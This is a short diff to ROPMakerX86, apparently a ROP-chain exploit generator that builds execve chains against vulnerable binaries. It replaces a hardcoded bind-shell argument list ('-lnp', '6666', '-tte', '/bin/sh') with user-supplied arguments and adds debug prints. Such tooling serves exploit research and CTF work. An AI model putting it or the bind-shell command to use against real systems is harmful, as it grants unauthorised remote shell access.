@@ -176,12 +176,12 @@ class ROPMakerX86(object):
         """
 
 
-        filename = "/tmp/printArgs"
         # [filename, arg1, arg2, ...]
-        args = [filename, '-lnp', '6666', '-tte', '/bin/sh']
+        args = Args().getArgs().execute.split()
+        print (f"ARGS: {args}")
         argPointers = []
 
-        env = ['name=Joe', 'OLDPWD=/home/vagrant', 'SHLVL=1']
+        env = Args().getArgs().env.split()
         envPointers = []
 
         sects = self.__binary.getDataSections()
@@ -409,4 +409,5 @@ class ROPMakerX86(object):
 
         args = Args().getArgs()
         self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
+        print(f"STUFF {calculate_buffer_length(args.binary)}")
         self.__buildExecveRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, calculate_buffer_length(args.binary))
